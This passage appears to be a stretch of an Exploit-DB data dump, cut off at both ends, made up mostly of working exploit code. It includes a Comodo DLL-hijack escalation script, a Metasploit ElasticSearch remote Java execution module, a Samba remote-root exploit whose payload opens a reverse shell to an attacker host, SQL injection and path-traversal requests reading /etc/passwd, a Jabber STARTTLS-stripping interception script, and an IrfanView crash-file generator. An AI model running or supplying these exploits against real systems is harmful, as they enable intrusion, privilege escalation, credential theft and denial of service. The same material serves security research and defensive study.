setup_clps_system_cleaner_monitor_release-4.12.317464.8.exe 10/06/2015  12:07 AM           648,912 setup_clps_windows_event_monitor_release-4.19.362032.8.exe 10/02/2015  10:43 PM                 1 survey_version.txt 10/06/2015  12:05 AM    <DIR>          updates  The C:\ProgramData\Comodo\lps4\temp\ folder has the following permission configuration:  C:\ProgramData\Comodo\lps4\temp NT AUTHORITY\SYSTEM:(OI)(CI)(ID)F                                 BUILTIN\Administrators:(OI)(CI)(ID)F                                 CREATOR OWNER:(OI)(CI)(IO)(ID)F                                 BUILTIN\Users:(OI)(CI)(ID)R                                 BUILTIN\Users:(CI)(ID)(special access:)                                                       FILE_WRITE_DATA                                                       FILE_APPEND_DATA                                                       FILE_WRITE_EA                                                       FILE_WRITE_ATTRIBUTES  Notice how the folder allows Users to have FILE_WRITE_DATA and FILE_WRITE_EA access.  This allows  non-administrator users the ability to create files in the directory but not delete or modify  existing files.  Comodo's main service engine is controlled by the SYSTEM service Launcher-Service.exe which resides in the C:\Program Files (x86)\Common Files\COMODO\ folder.  This service is auto launched by the  registry key HKLM\System\CurrentControlSet\Services\CLPSLauncher  This binary will then launch Unit_Manager.exe in the C:\Program Files\COMODO\GeekBuddy with SYSTEM  level privielges.  This binary in turn then launches the binary C:\Program Files\COMODO\GeekBuddy\unit.exe  to handle each sub process in the C:\ProgramData\Comodo\lps4\temp\ folder.  During client connections to update servers and Geek Buddy executions the unit.exe binary will  launch the binary setup_clps_client_transaction_release-4.19.365037.89.exe.  This setup binary has  hardcoded DLL loading procedures to look for SHFOLDER.DLL in the current directory which it is  executed from.  .data:00409240                 dd offset aShfolder     ; ""SHFOLDER"" .data:00409244                 dd offset aShgetfolderpat ; ""SHGetFolderPathA""  During this delay load procedure the exe will load SHFOLDER.DLL from its local directory before  looking in the other PATHS variables.  By planting a malicious SHFOLDER.DLL in the C:\ProgramData\Comodo\lps4\temp\ and triggering an  update or client connection to secure servers (which occurs automatically at user login) a user can  elevate their privileges to SYSTEM and compromise the system fully.   ######### GREETZ ###################################################################################### 1st off all my new homies in the Vectra Networks Research Team - you guys are seriously legit mad #respect to everyone here. #Humbled  @taviso - keep killing it and thanks for being an inspiration @bill_billbil - sup girl chicken rico n chill @tacticalRCE - Its no 100 mile rides but will miss all the good times.  C-ya around mang. @hellNBak_ - drop tehm greetz like its 2003 @hacksforpancakes - make plans for other NullCon in 2016 ;) @jduck - we gonna juke some more toyotas next time you come visit @hdmoore - good luck with your ventures good sir @jsoo - dont give up good sir - you're doing awesome @thegrugq - when i grow up i hope im half as wise as you good sir @daveaitel - Triangular Anus logos are the best @da_667 - AYYYYYYYYYYYYYY LMAO @bonovoxly - Clever Girls Wear Pink on Wednesdays Derek Soeder - Respect to you brother, keep on being awesome Benny 29A - next time im in CZ lets get beers, im buying Yuji Ukai - #RESPECT to everything you have ever done and will ever do.  #Ninja Sizzop - for fixing my greetz  #########################################################################################################   #>  Param (      [Parameter(ValueFromPipelineByPropertyName = $true)]     [string]$DLL = """" )     if (!(Test-Path $DLL)) {     throw ""Fatal Error: The specified file: $DLL does not exist.""   }  Copy-Item -Path $DLL -Destination ""C:\ProgramData\Comodo\lps4\temp\SHFolder.dll"" -Force  Write-Host ""Copying $DLL to the Comodo AV GeekBuddy's insecure temp folder as SHFolder.dll"" -ForegroundColor Red   [void][System.Reflection.Assembly]::LoadWithPartialName(""System.Windows.Forms"")  $objNotifyIcon = New-Object System.Windows.Forms.NotifyIcon    $MyPath = Get-Process -id $pid | Select-Object -ExpandProperty Path $objNotifyIcon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($MyPath) $objNotifyIcon.BalloonTipIcon = ""Info""  $objNotifyIcon.BalloonTipText = ""Hijacked SHFolder.DLL with $DLL. Now manually update Comodo Anti-Virus using the GUI or Reboot the system to gain SYSTEM Level Privileges""  $objNotifyIcon.BalloonTipTitle = ""@Laughing_Mantis""   $objNotifyIcon.Visible = $True  $objNotifyIcon.ShowBalloonTip(8000)",Comodo,1
39512,"Viscomsoft Calendar Active-X 2.0 - Multiple Crashes (PoC) # Exploit Title: Viscomsoft Calendar Active-X 2.0 - Multiple Crash PoCs # Date: 01-03-2016 # Exploit Author: Shantanu Khandelwal  Twitter: @shantanu561993 <shantanu561993@gmail.com> # Vendor Homepage: http://www.viscomsoft.com/ # Software Link: http://www.viscomsoft.com/downloads/calendar.html # Version: 2.0 # Tested on: Windows XP IE-8 , Windows 7 IE-8  Multiple Vulnerabilities found in calender.ocx file Multiple Access violations  POC:   https://www.dropbox.com/s/rtakkmw9ru55lbn/CALENDARLib.zip?dl=0 https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39512.zip",.vis,1
33588,"ElasticSearch Dynamic Script - Arbitrary Java Execution (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::FileDropper    def initialize(info = {})     super(update_info(info,       'Name'           => 'ElasticSearch Dynamic Script Arbitrary Java Execution',       'Description'    => %q{         This module exploits a remote command execution vulnerability in ElasticSearch,         exploitable by default on ElasticSearch prior to 1.2.0. The bug is found in the         REST API, which requires no authentication or authorization, where the search         function allows dynamic scripts execution, and can be used for remote attackers         to execute arbitrary Java code. This module has been tested successfully on         ElasticSearch 1.1.1 on Ubuntu Server 12.04 and Windows XP SP3.       },       'Author'         =>         [           'Alex Brasetvik',     # Vulnerability discovery           'Bouke van der Bijl', # Vulnerability discovery and PoC           'juan vazquez'        # Metasploit module         ],       'License'        => MSF_LICENSE,       'References'     =>         [           ['CVE', '2014-3120'],           ['OSVDB', '106949'],           ['EDB', '33370'],           ['URL', 'http://bouk.co/blog/elasticsearch-rce/'],           ['URL', 'https://www.found.no/foundation/elasticsearch-security/#staying-safe-while-developing-with-elasticsearch']         ],       'Platform'       => 'java',       'Arch'           => ARCH_JAVA,       'Targets'        =>         [           [ 'ElasticSearch 1.1.1 / Automatic', { } ]         ],       'DisclosureDate' => 'Dec 09 2013',       'DefaultTarget' => 0))        register_options(         [           Opt::RPORT(9200),           OptString.new('TARGETURI', [ true, 'The path to the ElasticSearch REST API', ""/""]),           OptString.new(""WritableDir"", [ true, ""A directory where we can write files (only for *nix environments)"", ""/tmp"" ])         ], self.class)   end    def check     result = Exploit::CheckCode::Safe      if vulnerable?       result = Exploit::CheckCode::Vulnerable     end      result   end    def exploit     print_status(""#{peer} - Trying to execute arbitrary Java.."")     unless vulnerable?       fail_with(Failure::Unknown, ""#{peer} - Java has not been executed, aborting..."")     end      print_status(""#{peer} - Asking remote OS..."")     res = execute(java_os)     result = parse_result(res)     if result.nil?       fail_with(Failure::Unknown, ""#{peer} - Could not get remote OS..."")     else       print_good(""#{peer} - OS #{result} found"")     end      jar_file = """"     if result =~ /win/i       print_status(""#{peer} - Asking TEMP path"")       res = execute(java_tmp_dir)       result = parse_result(res)       if result.nil?         fail_with(Failure::Unknown, ""#{peer} - Could not get TEMP path..."")       else         print_good(""#{peer} - TEMP path found on #{result}"")       end       jar_file = ""#{result}#{rand_text_alpha(3 + rand(4))}.jar""     else       jar_file = File.join(datastore['WritableDir'], ""#{rand_text_alpha(3 + rand(4))}.jar"")     end      register_file_for_cleanup(jar_file)     execute(java_payload(jar_file))   end    def vulnerable?     addend_one = rand_text_numeric(rand(3) + 1).to_i     addend_two = rand_text_numeric(rand(3) + 1).to_i     sum = addend_one + addend_two      java = java_sum([addend_one, addend_two])     res = execute(java)     result = parse_result(res)      if result.nil?       return false     else       result.to_i == sum     end   end    def parse_result(res)     unless res && res.code == 200 && res.body       return nil     end      begin       json = JSON.parse(res.body.to_s)     rescue JSON::ParserError       return nil     end      begin       result = json['hits']['hits'][0]['fields']['msf_result'][0]     rescue       return nil     end      result   end    def java_sum(summands)     source = <<-EOF #{summands.join("" + "")}     EOF      source   end    def to_java_byte_array(str)     buff = ""byte[] buf = new byte[#{str.length}];\n""     i = 0     str.unpack('C*').each do |c|       buff << ""buf[#{i}] = #{c};\n""       i = i + 1     end      buff   end    def java_os     ""System.getProperty(\""os.name\"")""   end    def java_tmp_dir     ""System.getProperty(\""java.io.tmpdir\"");""   end     def java_payload(file_name)     source = <<-EOF import java.io.*; import java.lang.*; import java.net.*;  #{to_java_byte_array(payload.encoded_jar.pack)} File f = new File('#{file_name.gsub(/\\/, ""/"")}'); FileOutputStream fs = new FileOutputStream(f); bs = new BufferedOutputStream(fs); bs.write(buf); bs.close(); bs = null; URL u = f.toURI().toURL(); URLClassLoader cl = new URLClassLoader(new java.net.URL[]{u}); Class c = cl.loadClass('metasploit.Payload'); c.main(null);     EOF      source   end    def execute(java)     payload = {       ""size"" => 1,       ""query"" => {         ""filtered"" => {           ""query"" => {             ""match_all"" => {}           }         }       },       ""script_fields"" => {         ""msf_result"" => {           ""script"" => java         }       }     }      res = send_request_cgi({       'uri'    => normalize_uri(target_uri.path.to_s, ""_search""),       'method' => 'POST',       'data'   => JSON.generate(payload)     })      return res   end  end",ElasticSearch,1
17808,"WordPress Plugin WP-Filebase Download Manager 0.2.9 - SQL Injection # Exploit Title: WordPress WP-Filebase Download Manager plugin <= 0.2.9 SQL Injection Vulnerability # Date: 2011-09-09 # Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm) # Software Link: http://downloads.wordpress.org/plugin/wp-filebase.0.2.9.zip # Version: 0.2.9 (tested)  --- PoC --- http://www.site.com/wp-content/plugins/wp-filebase/wpfb-ajax.php?action=tree&base=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20&root=source  --------------- Vulnerable code --------------- if(!isset($_REQUEST['action']))     die('-1'); ... switch ( $action = $_REQUEST['action'] ) {     case 'tree':         ...         $base_id = (empty($_REQUEST['base']) ? 0 : $_REQUEST['base']);         ...         if(empty($_REQUEST['root']) || $_REQUEST['root'] == 'source')             $parent_id = $base_id;         else {             $root = $_REQUEST['root'];             $parent_id = is_numeric($root) ? intval($root) : intval(substr(strrchr($root,'-'),1));         }         ...         $cats = $browser ? WPFB_Category::GetFileBrowserCats($parent_id) : WPFB_Category::GetCats(""WHERE cat_parent = $parent_id ORDER BY cat_name ASC"");",.site.,0
37834,"Samba 3.5.11/3.6.3 - Remote Code Execution source: https://www.securityfocus.com/bid/55655/info  Samba is prone to an unspecified remote code-execution vulnerability.  An attacker can exploit this issue to execute arbitrary code with root privileges. Failed exploit attempts will cause a denial-of-service condition.   #!/usr/bin/python # # finding targets 4 31337z: # gdb /usr/sbin/smbd `ps auwx | grep smbd | grep -v grep | head -n1 | awk '{ print $2 }'` <<< `echo -e ""print system""` | grep '$1' #    -> to get system_libc_addr, enter this value in the 'system_libc_offset' value of the target_finder, run, sit back, wait for shell # found by eax samba 0day godz (loljk)   from binascii import hexlify, unhexlify import socket import threading import SocketServer import sys import os import time import struct        targets = [ 	{ 		""name""               : ""samba_3.6.3-debian6"", 		""chunk_offset""       : 0x9148, 		""system_libc_offset"" : 0xb6d003c0 	}, 	{ 		""name""               : ""samba_3.5.11~dfsg-1ubuntu2.1_i386 (oneiric)"", 		""chunk_offset""       : 4560,  		""system_libc_offset"" : 0xb20 	}, 	{ 		""name""               : ""target_finder (hardcode correct system addr)"",  		""chunk_offset""       : 0,  		""system_libc_offset"" : 0xb6d1a3c0,  		""finder"": True 	} ]  do_brute = True rs = 1024 FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])  def dump(src, length=32): 	result=[] 	for i in xrange(0, len(src), length): 		s = src[i:i+length] 		hexa = ' '.join([""%02x""%ord(x) for x in s]) 		printable = s.translate(FILTER) 		result.append(""%04x   %-*s   %s\n"" % (i, length*3, hexa, printable)) 	return ''.join(result)   sploitshake = [ 	# HELLO 	""8100004420434b4644454e4543464445"" + \ 	""46464346474546464343414341434143"" + \ 	""41434143410020454745424644464545"" + \ 	""43455046494341434143414341434143"" + \ 	""4143414341414100"",  	# NTLM_NEGOT 	""0000002fff534d427200000000000000"" + \ 	""00000000000000000000000000001d14"" + \ 	""00000000000c00024e54204c4d20302e"" + \ 	""313200"",  	# SESSION_SETUP 	""0000004bff534d427300000000080000"" + \ 	""000000000000000000000000ffff1d14"" + \ 	""000000000dff000000ffff02001d1499"" + \ 	""1f00000000000000000000010000000e"" + \ 	""000000706f736978007079736d6200"",  	# TREE_CONNECT 	""00000044ff534d427500000000080000"" + \ 	""000000000000000000000000ffff1d14"" + \ 	""6400000004ff00000000000100190000"" + \ 	""5c5c2a534d425345525645525c495043"" + \ 	""24003f3f3f3f3f00"",  	# NT_CREATE 	""00000059ff534d42a200000000180100"" + \ 	""00000000000000000000000001001d14"" + \ 	""6400000018ff00000000050016000000"" + \ 	""000000009f0102000000000000000000"" + \ 	""00000000030000000100000040000000"" + \ 	""020000000306005c73616d7200"" ]  pwnsauce = { 	'smb_bind': \ 		""00000092ff534d422500000000000100"" + \ 		""00000000000000000000000001001d14"" + \ 		""6400000010000048000004e0ff000000"" + \ 		""0000000000000000004a0048004a0002"" + \ 		""002600babe4f005c504950455c000500"" + \ 		""0b03100000004800000001000000b810"" + \ 		""b8100000000001000000000001007857"" + \ 		""34123412cdabef000123456789ab0000"" + \ 		""0000045d888aeb1cc9119fe808002b10"" + \ 		""486002000000"",  	'data_chunk': \ 		""000010efff534d422f00000000180000"" + \ 		""00000000000000000000000001001d14"" + \ 		""640000000eff000000babe00000000ff"" + \ 		""0000000800b0100000b0103f00000000"" + \ 		""00b0100500000110000000b010000001"" + \ 		""0000009810000000000800"",  	'final_chunk': \ 		""000009a3ff534d422f00000000180000"" + \ 		""00000000000000000000000001001d14"" + \ 		""640000000eff000000babe00000000ff"" + \ 		""00000008006409000064093f00000000"" + \ 		""00640905000002100000006409000001"" + \ 		""0000004c09000000000800"" }   def exploit(host, port, cbhost, cbport, target): 	global sploitshake, pwnsauce  	chunk_size = 4248  	target_tcp = (host, port)  	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 	s.connect(target_tcp)  	n = 0 	for pkt in sploitshake: 		s.send(unhexlify(pkt)) 		pkt_res = s.recv(rs) 		n = n+1  	fid = hexlify(pkt_res[0x2a] + pkt_res[0x2b])  	s.send(unhexlify(pwnsauce['smb_bind'].replace(""babe"", fid))) 	pkt_res = s.recv(rs)  	buf = ""X""*20  # policy handle 	level = 2 #LSA_POLICY_INFO_AUDIT_EVENTS 	buf+=struct.pack('<H',level) # level 	buf+=struct.pack('<H',level)# level2 	buf+=struct.pack('<L',1)#auditing_mode 	buf+=struct.pack('<L',1)#ptr 	buf+=struct.pack('<L',100000) # r->count 	buf+=struct.pack('<L',20) # array_size 	buf+=struct.pack('<L',0) 	buf+=struct.pack('<L',100)  	buf += (""A"" * target['chunk_offset'])  	buf+=struct.pack(""I"", 0); 	buf+=struct.pack(""I"", target['system_libc_offset']); 	buf+=struct.pack(""I"", 0); 	buf+=struct.pack(""I"", target['system_libc_offset']); 	buf+=struct.pack(""I"", 0xe8150c70); 	buf+=""AAAABBBB""  	cmd = "";;;;/bin/bash -c '/bin/bash 0</dev/tcp/""+cbhost+""/""+cbport+"" 1>&0 2>&0' &\x00""  	tmp = cmd*(816/len(cmd)) 	tmp += ""\x00""*(816-len(tmp))  	buf+=tmp 	buf+=""A""*(37192-target['chunk_offset']) 	buf+='z'*(100000 - (28000 + 10000))  	buf_chunks = [buf[x:x+chunk_size] for x in xrange(0, len(buf), chunk_size)] 	n=0  	for chunk in buf_chunks: 		if len(chunk) != chunk_size: 			#print ""LAST CHUNK #%d"" % n 			bb = unhexlify(pwnsauce['final_chunk'].replace(""babe"", fid)) + chunk 			s.send(bb) 		else: 			#print ""CHUNK #%d"" % n 			bb = unhexlify(pwnsauce['data_chunk'].replace(""babe"", fid)) + chunk 			s.send(bb) 			retbuf = s.recv(rs) 		n=n+1  	s.close()  class connectback_shell(SocketServer.BaseRequestHandler): 	def handle(self): 		global do_brute  		print ""\n[!] connectback shell from %s"" % self.client_address[0] 		do_brute = False  		s = self.request  		import termios, tty, select, os 		old_settings = termios.tcgetattr(0) 		try: 			tty.setcbreak(0) 			c = True 			while c: 				for i in select.select([0, s.fileno()], [], [], 0)[0]: 					c = os.read(i, 1024) 					if c: 						if i == 0: 							os.write(1, c)  						os.write(s.fileno() if i == 0 else 1, c) 		except KeyboardInterrupt: pass 		finally: termios.tcsetattr(0, termios.TCSADRAIN, old_settings)  		return 		  class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): 	pass   if len(sys.argv) != 6: 	print ""\n  {*} samba 3.x remote root by kd(eax)@ireleaseyourohdayfuckyou {*}\n"" 	print ""  usage: %s <targethost> <targetport> <myip> <myport> <target>\n"" % (sys.argv[0]) 	print ""  targets:"" 	i = 0 	for target in targets: 		print ""    %02d) %s"" % (i, target['name']) 		i = i+1  	print """" 	sys.exit(-1)   target = targets[int(sys.argv[5])]  server = ThreadedTCPServer((sys.argv[3], int(sys.argv[4])), connectback_shell) server_thread = threading.Thread(target=server.serve_forever) server_thread.daemon = True server_thread.start()  while do_brute == True: 	sys.stdout.write(""\r{+} TRYING EIP=\x1b[31m0x%08x\x1b[0m OFFSET=\x1b[32m0x%08x\x1b[0m"" % (target['system_libc_offset'], target['chunk_offset'])) 	sys.stdout.flush() 	exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], target)  	if ""finder"" in target: 		target['chunk_offset'] += 4 	else: 		target['system_libc_offset'] += 0x1000   if ""finder"" in target: 	print \ 		""{!} found \x1b[32mNEW\x1b[0m target: chunk_offset = ~%d, "" \ 		""system_libc_offset = 0x%03x"" % \ 		(target['chunk_offset'], target['system_libc_offset'] & 0xff000fff)  while 1: 	time.sleep(999)  server.shutdown()",samba,1
20725,"Microburst uStorekeeper 1.x - Arbitrary Commands source: https://www.securityfocus.com/bid/2536/info  A vulnerability exists in versions of uStorekeeper Online Shopping System from Microburst Technologies.  The script fails to properly validate user-supplied input, allowing remote users to submit URLs containing '/../' sequences and arbitrary filenames or commands, which will be executed or displayed with the privilege level of the webserver user.  This permits the remote user to request files and execute commands from arbitrary locations on the host filesystem, outside the script's normal directory scope.  http://www.example.com/cgi-bin/ustorekeeper.pl?command=goto&file=../../../../../../../../etc/hosts  http://www.example.com/cgi-bin/ustorekeeper.pl?command=goto&file=../../../../../../../../bin/ls |  http://www.example.com/cgi-bin/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd  http://www.example .com/cgi-bin/ustorekeeper.pl?command=goto&file=../../../../../../../../. ./../../../../bin/cat%20ustorekeeper.pl|",Microburst,1
33816,"Miranda IM 0.8.16 - Information Disclosure source: https://www.securityfocus.com/bid/39209/info  Miranda IM is prone to an information-disclosure vulnerability.  Successful exploits of this issue may allow attackers to perform man-in-the-middle attacks against vulnerable applications and to disclose sensitive information.  #!/usr/bin/perl  # Miranda IM TLS MitM Proof of Concept # by Jan Schejbal, 2010-03-19  # MAY WORK WITHOUT MODIFICATIONS AGAINST OTHER CLIENTS WITH THIS ISSUE! # Generally: Will work if client also accepts unencrypted connections # if the server reports that TLS is not supported.  # Tested only on WinXP SP3 with ActivePerl 5.10.0 # against Miranda 0.8.16  # Usage: #  1. Setup variables below, unless you want to test against jabber.ccc.de #       (note that this script does not do real XML parsing. Other servers #        might have slightly different code that will not be detected. #        In such a case, connecting will lock up. Adapt the RegExp below.)  #  2. Make 'victim' connect to this server instead of real server #       Network->Jabber->Account->Manually specify connection host #       (real attacks would use ARP spoofing, DNS spoofing or similar.) #  3. Enable 'Use TLS' #       (make sure that 'Disable SASL' on advanced is UNCHECKED, #        as it silently disables TLS!) #  4. Start script and connect with miranda #  5. If all works, the dump goes to STDOUT, state is shown on STDERR. #       (All traffic should be sent in plain now!)   use strict; use warnings;  use IO::Socket; use IO::Select;  my $server = 'jabber.ccc.de'; my $port = 5222; my $listenport = $port;  my $sock = new IO::Socket::INET(     LocalHost => '0.0.0.0',     LocalPort => $listenport,     Proto => 'tcp',     Listen => 1,     Reuse => 1,   );  print STDERR ""Listening on $listenport for jabber connections\n""; print STDERR ""Will forward to $server:$port\n"";    my $client_connection = $sock->accept();  print STDERR ""Incoming connection\n"";  my $server_connection = new IO::Socket::INET(     PeerAddr => $server,     PeerPort => $port,     Proto => 'tcp',   );  print STDERR ""Connected to server\n"";  $server_connection->blocking(0); $client_connection->blocking(0);   my $sel = IO::Select->new(); $sel->add($server_connection); $sel->add($client_connection);  my $server_hello_done = 0; my $server_hello_data;  my $readdata; my @ready; while(@ready = $sel->can_read()) {   foreach my $ready_conn (@ready) {     if (!sysread($ready_conn, $readdata, 10000)) {       print STDERR ""\nReading failed!\n"";       exit(1);     }     print ""$readdata\n"";     if ($ready_conn == $server_connection) {       # read was from server       if (!$server_hello_done) {         $server_hello_data .= $readdata;         print STDERR ""\nCurrent server hello buf: $server_hello_data\n\n"";         if ($server_hello_data =~ s|<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>||) {           print STDERR ""removed STARTTLS offer from server hello\n"";           $server_hello_done = 1;           print $client_connection $server_hello_data;           print STDERR ""\nforwarded cached server hello buf: \n$server_hello_data\n\n"";           print STDERR ""MitM complete. Forwarding data ('<' = to client, '>' = to server)\n"";         }       } else {         print $client_connection $readdata;         if ($server_hello_done) { print STDERR '<'; }       }            } else {       # read was from client, send to server       print $server_connection $readdata;       if ($server_hello_done) { print STDERR '>'; }     }   } }",Miranda,1
45773,"SiAdmin 1.1 - 'id' SQL Injection # Exploit Title: SiAdmin 1.1 - 'id' SQL Injection # Dork: N/A # Date: 2018-11-04 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://www.bubul.net/ # Software Link: https://kent.dl.sourceforge.net/project/siadmin/SiAdmin%201.1/SiAdmin%201.1.zip # Version: 1.1 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # http://localhost/[PATH]/modul/mod_beasiswa/print.php?op=print&id=[SQL] #  GET /[PATH]/modul/mod_beasiswa/print.php?op=print&id=-4%27%20%20UNION%20%20SELECT%201,2,3,4,5,6,(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x),8--%20- HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=va3kfka1v4dqvadpkdpm7f7vs0 Connection: keep-alive HTTP/1.1 200 OK Date: Sun, 04 Nov 2018 13:22:52 GMT Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30 X-Powered-By: PHP/5.6.30 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: private, max-age=0, must-revalidate Pragma: public Content-Disposition: inline; filename=""Ansanwan-Laporan.pdf"" Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: application/pdf  # POC:  # 2) # http://localhost/[PATH]/show.php?op=beasiswa&act=lihat&id=[SQL] #  GET /[PATH]/show.php?op=beasiswa&act=lihat&id=%2d%34%27%20%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%32%2c%33%2c%34%2c%35%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%37%2c%38%2d%2d%20%2d HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=va3kfka1v4dqvadpkdpm7f7vs0 Connection: keep-alive HTTP/1.1 200 OK Date: Sun, 04 Nov 2018 13:30:25 GMT Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30 X-Powered-By: PHP/5.6.30 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 6079 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8",.bubul.,0
17143,"IrfanView 4.28 - '.ICO' Without Transparent Colour Denial of Service / Remote Denial of Service # done by BraniX <branix@hackers.org.pl> # www.hackers.org.pl # found: 2011.04.07 # published: 2011.04.10 # tested on: Windows XP SP3 Home Edition # tested on: Windows XP SP3 Professional  # App: IrfanView 4.28 # App Url: http://www.irfanview.com # i_view32.exe MD5: c6d9383c4119a59aad70dbc4a974b8b4  # DoS is caused by not handled Access Violation Exception in module i_view32.exe  # It can be triggered from: # Local: C:\Without Transparent Colour - DoS.ico # Remote: \\MySecretServer\Without Transparent Colour - DoS.ico  # 004162D0    8B4424 04       MOV EAX,DWORD PTR SS:[ESP+4] # 004162D4    B2 80           MOV DL,80 # 004162D6    8AC8            MOV CL,AL # 004162D8    53              PUSH EBX # 004162D9    80E1 07         AND CL,7 # 004162DC    D2EA            SHR DL,CL # 004162DE    8B4C24 0C       MOV ECX,DWORD PTR SS:[ESP+C] # 004162E2    C1E8 03         SHR EAX,3 # 004162E5    8A1C08          MOV BL,BYTE PTR DS:[EAX+ECX]             ; Invalid address -> Access Violation when reading # 004162E8    22D3            AND DL,BL # 004162EA    5B              POP EBX # 004162EB    F6DA            NEG DL # 004162ED    1BD2            SBB EDX,EDX # 004162EF    F7DA            NEG EDX # 004162F1    8BC2            MOV EAX,EDX # 004162F3    C3              RETN  filepath = ""C:\\Without Transparent Colour - DoS.ico"" f = open(filepath, ""wb"") poc = '\x00\x00\x01\x00\x01\x00\x0B\x0D\x00\x00\x01\x00\x18\x00\x30\x02\x00\x00\x16\x00\x00\x00\x28\x00\x00\x00\xFF\x00\x00\x00\x1A\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1E\x17\x14\x1C\x23\x14\x1C\x23\x14\x2D\x26\x16\x1C\x23\x14\x1C\x23\x14\x1C\x23\x14\x35\x27\x24\x36\x33\x35\x2C\x33\x4B\x2C\x33\x4B\x00\x00\x00\x1C\x23\x14\x1C\x23\x14\x1C\x23\x14\x1C\x23\x14\x1C\x23\x14\x3F\x39\x48\x48\x54\x67\x33\x29\x34\x36\x33\x35\x2C\x33\x4B\x44\x46\x65\x00\x00\x00\x36\x33\x35\x56\x58\x76\x64\x67\x87\x35\x44\x4D\x1E\x17\x14\x64\x67\x87\x65\x78\x96\x35\x27\x24\x36\x33\x35\x2C\x33\x4B\x48\x54\x67\x00\x00\x00\x27\x34\x33\x65\x78\x96\x65\x78\x96\x48\x54\x67\x56\x55\x67\x77\x76\x98\x44\x44\x56\x25\x24\x24\x3F\x39\x48\x44\x44\x56\x48\x54\x67\x00\x00\x00\x44\x44\x56\x44\x46\x65\x36\x33\x35\x67\x66\x77\x65\x59\x90\x67\x66\x99\x56\x55\x67\x25\x24\x24\x3F\x39\x48\x44\x44\x56\x44\x46\x65\x00\x00\x00\x77\x69\xCA\x56\x58\x76\x44\x35\x2F\x77\x76\x98\x76\x6B\x98\x77\x76\x98\x34\x46\x2E\x25\x26\x37\x2C\x33\x4B\x3F\x39\x48\x48\x54\x67\x00\x00\x00\x65\x59\x90\x44\x44\x56\x55\x49\x65\x51\x47\x46\x55\x56\x58\x34\x46\x2E\x36\x33\x35\x36\x33\x35\x2C\x33\x4B\x2C\x33\x4B\x47\x56\x76\x00\x00\x00\x75\x69\x88\x55\x49\x65\x52\x55\x8B\x46\x43\x44\x36\x33\x35\x44\x44\x56\x44\x44\x56\x3F\x39\x48\x3F\x39\x48\x3F\x39\x48\x56\x58\x76\x00\x00\x00\x67\x66\x77\x44\x44\x56\x55\x49\x65\x55\x49\x65\x56\x58\x76\x65\x59\x90\x55\x49\x65\x3F\x39\x48\x33\x29\x34\x3F\x39\x48\x56\x58\x76\x00\x00\x00\x55\x49\x65\x55\x49\x65\x55\x49\x65\x65\x59\x90\x67\x66\x99\x65\x59\x90\x55\x49\x65\x3F\x39\x48\x33\x29\x34\x44\x44\x56\x64\x67\x87\x00\x00\x00\x4F\x49\x56\x55\x49\x65\x55\x49\x65\x56\x55\x67\x65\x59\x70\x64\x67\x87\x56\x58\x76\x3F\x39\x48\x2C\x33\x4B\x44\x46\x65\x54\x69\x8C\x00\x00\x00\x55\x49\x65\x55\x49\x65\x55\x49\x65\x55\x49\x65\x65\x59\x90\x65\x59\x90\x55\x49\x7A\x3F\x39\x48\x3F\x39\x48\x56\x58\x76\x65\x78\x96\x00\x00\x00\x65\x59\x90\x56\x58\x76\x52\x55\x8B\x65\x59\x90\x6C\x58\xB0\x67\x66\x99\x52\x55\x8B\x3F\x39\x48\x2C\x33\x4B\x56\x58\x76\x77\x8F\xA